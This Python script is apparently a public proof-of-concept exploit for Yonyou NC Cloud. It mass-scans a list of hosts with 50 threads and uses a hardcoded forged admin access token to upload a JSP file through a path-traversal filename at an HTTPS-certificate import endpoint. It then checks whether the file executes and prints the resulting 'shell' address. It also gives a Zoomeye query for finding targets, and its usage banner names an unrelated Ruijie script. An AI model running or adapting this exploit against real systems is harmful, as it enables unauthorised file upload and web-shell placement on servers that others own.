#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# Zoomeye: app:"Yonyou NC Cloud"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 Ruijie_NBR_FileUpload_Poc.py url.txt                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8081'
}  
requests.packages.urllib3.disable_warnings()

def exp(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Host": "%s" %host2,
        "Content-Type": "multipart/form-data; boundary=fd28cb44e829ed1c197ec3bc71748df0",
        "Accept-Encoding": "gzip, deflate",
        "accessToken":"eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA"
    }
    vulurl = url + "/nccloud/mob/pfxx/manualload/importhttpscer"
    data="""--fd28cb44e829ed1c197ec3bc71748df0\r\nContent-Disposition: form-data; name="file"; filename="./webapps/nc_web/141172.jsp"\r\n\r\n<%out.println(1111*1111);%>\r\n--fd28cb44e829ed1c197ec3bc71748df0--"""
    try:
        r = requests.post(vulurl, data=data,headers=headers,verify=False,proxies=proxysdata)
        r2 = requests.get(url+"/141172.jsp")
        if "1234321" in r2.text :
            print("shell地址为："+url+"/141172.jsp")     
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])